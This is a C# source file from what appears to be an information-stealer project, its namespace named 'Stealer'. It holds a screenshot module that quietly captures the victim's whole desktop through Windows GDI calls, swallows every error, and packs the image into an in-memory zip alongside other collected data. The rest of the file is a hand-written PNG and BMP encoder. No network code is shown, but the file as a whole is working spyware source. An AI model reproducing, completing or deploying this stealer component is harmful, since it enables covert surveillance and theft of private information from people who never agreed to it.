using IntelXPro.src.IntelXPro.Dependencies.Data;
using IntelXPro.src.IntelXPro.Stealer;
using System;
using System.IO;
using System.Runtime.InteropServices;

namespace IntelXPro.src.IntelXPro.Stealer.General
{
    internal class ScreenShot : ITarget
    {
        [DllImport("user32.dll")]
        private static extern IntPtr GetDesktopWindow();

        [DllImport("user32.dll")]
        private static extern IntPtr GetWindowDC(IntPtr hWnd);

        [DllImport("user32.dll")]
        private static extern IntPtr ReleaseDC(IntPtr hWnd, IntPtr hDC);

        [DllImport("user32.dll")]
        private static extern int GetSystemMetrics(int nIndex);

        [DllImport("gdi32.dll")]
        private static extern IntPtr CreateCompatibleDC(IntPtr hDC);

        [DllImport("gdi32.dll")]
        private static extern IntPtr CreateCompatibleBitmap(IntPtr hDC, int nWidth, int nHeight);

        [DllImport("gdi32.dll")]
        private static extern IntPtr SelectObject(IntPtr hDC, IntPtr hgdiobj);

        [DllImport("gdi32.dll")]
        private static extern bool BitBlt(IntPtr hObject, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hObjectSource, int nXSrc, int nYSrc, int dwRop);

        [DllImport("gdi32.dll")]
        private static extern bool DeleteDC(IntPtr hDC);

        [DllImport("gdi32.dll")]
        private static extern bool DeleteObject(IntPtr hObject);

        [DllImport("gdi32.dll")]
        private static extern int GetDIBits(IntPtr hdc, IntPtr hbmp, uint uStartScan, uint cScanLines, [Out] byte[] lpvBits, ref BITMAPINFO lpbmi, uint uUsage);

        [StructLayout(LayoutKind.Sequential)]
        private struct BITMAPINFO
        {
            public BITMAPINFOHEADER bmiHeader;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
            public RGBQUAD[] bmiColors;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct BITMAPINFOHEADER
        {
            public uint biSize;
            public int biWidth;
            public int biHeight;
            public ushort biPlanes;
            public ushort biBitCount;
            public uint biCompression;
            public uint biSizeImage;
            public int biXPelsPerMeter;
            public int biYPelsPerMeter;
            public uint biClrUsed;
            public uint biClrImportant;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct RGBQUAD
        {
            public byte rgbBlue;
            public byte rgbGreen;
            public byte rgbRed;
            public byte rgbReserved;
        }

        private const int SM_CXSCREEN = 0;
        private const int SM_CYSCREEN = 1;
        private const int SRCCOPY = 0x00CC0020;
        private const int DIB_RGB_COLORS = 0;

        public void Collect(InMemoryZip zip, Counter counter)
        {
            try
            {
                byte[] screenshotBytes = CaptureScreenToBMP();
                if (screenshotBytes != null && screenshotBytes.Length > 0)
                {
                    zip.AddFile("Screenshot.png", screenshotBytes);
                }
            }
            catch { }
        }

        private byte[] CaptureScreenToBMP()
        {
            try
            {
                int screenWidth = GetSystemMetrics(SM_CXSCREEN);
                int screenHeight = GetSystemMetrics(SM_CYSCREEN);

                IntPtr desktopWindow = GetDesktopWindow();
                IntPtr desktopDC = GetWindowDC(desktopWindow);
                IntPtr memoryDC = CreateCompatibleDC(desktopDC);
                IntPtr bitmap = CreateCompatibleBitmap(desktopDC, screenWidth, screenHeight);
                IntPtr oldBitmap = SelectObject(memoryDC, bitmap);

                BitBlt(memoryDC, 0, 0, screenWidth, screenHeight, desktopDC, 0, 0, SRCCOPY);

                BITMAPINFO bmpInfo = new BITMAPINFO();
                bmpInfo.bmiHeader.biSize = (uint)Marshal.SizeOf(typeof(BITMAPINFOHEADER));
                bmpInfo.bmiHeader.biWidth = screenWidth;
                bmpInfo.bmiHeader.biHeight = screenHeight;
                bmpInfo.bmiHeader.biPlanes = 1;
                bmpInfo.bmiHeader.biBitCount = 24;
                bmpInfo.bmiHeader.biCompression = 0;

                int stride = ((screenWidth * 3 + 3) / 4) * 4;
                int imageSize = stride * screenHeight;
                byte[] bitmapData = new byte[imageSize];

                GetDIBits(desktopDC, bitmap, 0, (uint)screenHeight, bitmapData, ref bmpInfo, DIB_RGB_COLORS);

                SelectObject(memoryDC, oldBitmap);
                DeleteDC(memoryDC);
                ReleaseDC(desktopWindow, desktopDC);
                DeleteObject(bitmap);

                return ConvertToPNG(bitmapData, screenWidth, screenHeight);
            }
            catch
            {
                return null;
            }
        }

        private byte[] ConvertToPNG(byte[] bitmapData, int width, int height)
        {
            try
            {
                using (MemoryStream stream = new MemoryStream())
                using (BinaryWriter writer = new BinaryWriter(stream))
                {
                    writer.Write(new byte[] { 0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A });

                    int stride = ((width * 3 + 3) / 4) * 4;
                    byte[] flippedData = new byte[bitmapData.Length];
                    
                    for (int y = 0; y < height; y++)
                    {
                        int srcOffset = y * stride;
                        int dstOffset = (height - 1 - y) * stride;
                        Array.Copy(bitmapData, srcOffset, flippedData, dstOffset, stride);
                    }

                    WriteIHDRChunk(writer, width, height);
                    WriteIDATChunk(writer, flippedData, width, height);
                    WriteIENDChunk(writer);

                    return stream.ToArray();
                }
            }
            catch
            {
                return CreateBMPFile(bitmapData, width, height);
            }
        }

        private void WriteIHDRChunk(BinaryWriter writer, int width, int height)
        {
            byte[] ihdrData = new byte[13];
            using (MemoryStream ms = new MemoryStream(ihdrData))
            using (BinaryWriter bw = new BinaryWriter(ms))
            {
                bw.Write(SwapBytes((uint)width));
                bw.Write(SwapBytes((uint)height));
                bw.Write((byte)8);
                bw.Write((byte)2);
                bw.Write((byte)0);
                bw.Write((byte)0);
                bw.Write((byte)0);
            }

            writer.Write(SwapBytes((uint)13));
            writer.Write(new byte[] { 0x49, 0x48, 0x44, 0x52 });
            writer.Write(ihdrData);
            writer.Write(SwapBytes(CalculateCRC(new byte[] { 0x49, 0x48, 0x44, 0x52 }, ihdrData)));
        }

        private void WriteIDATChunk(BinaryWriter writer, byte[] imageData, int width, int height)
        {
            byte[] compressedData = CompressImageData(imageData, width, height);
            writer.Write(SwapBytes((uint)compressedData.Length));
            writer.Write(new byte[] { 0x49, 0x44, 0x41, 0x54 });
            writer.Write(compressedData);
            writer.Write(SwapBytes(CalculateCRC(new byte[] { 0x49, 0x44, 0x41, 0x54 }, compressedData)));
        }

        private void WriteIENDChunk(BinaryWriter writer)
        {
            writer.Write(SwapBytes((uint)0));
            writer.Write(new byte[] { 0x49, 0x45, 0x4E, 0x44 });
            writer.Write(SwapBytes(CalculateCRC(new byte[] { 0x49, 0x45, 0x4E, 0x44 }, new byte[0])));
        }

        private byte[] CompressImageData(byte[] imageData, int width, int height)
        {
            try
            {
                using (MemoryStream output = new MemoryStream())
                {
                    output.WriteByte(0x78);
                    output.WriteByte(0x9C);

                    int stride = ((width * 3 + 3) / 4) * 4;
                    byte[] rawData;
                    using (MemoryStream input = new MemoryStream())
                    {
                        for (int y = 0; y < height; y++)
                        {
                            input.WriteByte(0);
                            for (int x = 0; x < width; x++)
                            {
                                int pixelIndex = y * stride + x * 3;
                                if (pixelIndex + 2 < imageData.Length)
                                {
                                    input.WriteByte(imageData[pixelIndex + 2]);
                                    input.WriteByte(imageData[pixelIndex + 1]);
                                    input.WriteByte(imageData[pixelIndex]);
                                }
                            }
                        }
                        rawData = input.ToArray();
                    }

                    byte[] simpleCompressed = SimpleDeflate(rawData);
                    output.Write(simpleCompressed, 0, simpleCompressed.Length);

                    uint adler32 = CalculateAdler32(rawData);
                    output.Write(new byte[] { 
                        (byte)((adler32 >> 24) & 0xFF),
                        (byte)((adler32 >> 16) & 0xFF),
                        (byte)((adler32 >> 8) & 0xFF),
                        (byte)(adler32 & 0xFF)
                    }, 0, 4);

                    return output.ToArray();
                }
            }
            catch
            {
                return new byte[0];
            }
        }

        private byte[] SimpleDeflate(byte[] data)
        {
            using (MemoryStream output = new MemoryStream())
            {
                int blockSize = 65535;
                for (int i = 0; i < data.Length; i += blockSize)
                {
                    int currentBlockSize = Math.Min(blockSize, data.Length - i);
                    bool isLastBlock = (i + currentBlockSize >= data.Length);

                    output.WriteByte((byte)(isLastBlock ? 1 : 0));
                    output.WriteByte((byte)(currentBlockSize & 0xFF));
                    output.WriteByte((byte)((currentBlockSize >> 8) & 0xFF));
                    output.WriteByte((byte)((~currentBlockSize) & 0xFF));
                    output.WriteByte((byte)(((~currentBlockSize) >> 8) & 0xFF));
                    output.Write(data, i, currentBlockSize);
                }
                return output.ToArray();
            }
        }

        private uint CalculateAdler32(byte[] data)
        {
            uint a = 1, b = 0;
            foreach (byte c in data)
            {
                a = (a + c) % 65521;
                b = (b + a) % 65521;
            }
            return (b << 16) | a;
        }

        private uint SwapBytes(uint value)
        {
            return ((value & 0xFF) << 24) | (((value >> 8) & 0xFF) << 16) | (((value >> 16) & 0xFF) << 8) | ((value >> 24) & 0xFF);
        }

        private uint CalculateCRC(byte[] type, byte[] data)
        {
            uint[] crcTable = new uint[256];
            for (uint i = 0; i < 256; i++)
            {
                uint c = i;
                for (int j = 0; j < 8; j++)
                {
                    if ((c & 1) == 1)
                        c = 0xEDB88320 ^ (c >> 1);
                    else
                        c = c >> 1;
                }
                crcTable[i] = c;
            }

            uint crc = 0xFFFFFFFF;
            foreach (byte b in type)
                crc = crcTable[(crc ^ b) & 0xFF] ^ (crc >> 8);
            foreach (byte b in data)
                crc = crcTable[(crc ^ b) & 0xFF] ^ (crc >> 8);
            return crc ^ 0xFFFFFFFF;
        }

        private byte[] CreateBMPFile(byte[] bitmapData, int width, int height)
        {
            try
            {
                int stride = ((width * 3 + 3) / 4) * 4;
                int imageSize = stride * height;
                int fileSize = 54 + imageSize;

                using (MemoryStream stream = new MemoryStream())
                using (BinaryWriter writer = new BinaryWriter(stream))
                {
                    writer.Write((ushort)0x4D42);
                    writer.Write(fileSize);
                    writer.Write(0);
                    writer.Write(54);

                    writer.Write(40);
                    writer.Write(width);
                    writer.Write(height);
                    writer.Write((ushort)1);
                    writer.Write((ushort)24);
                    writer.Write(0);
                    writer.Write(imageSize);
                    writer.Write(0);
                    writer.Write(0);
                    writer.Write(0);
                    writer.Write(0);

                    writer.Write(bitmapData);

                    return stream.ToArray();
                }
            }
            catch
            {
                return null;
            }
        }
    }
}
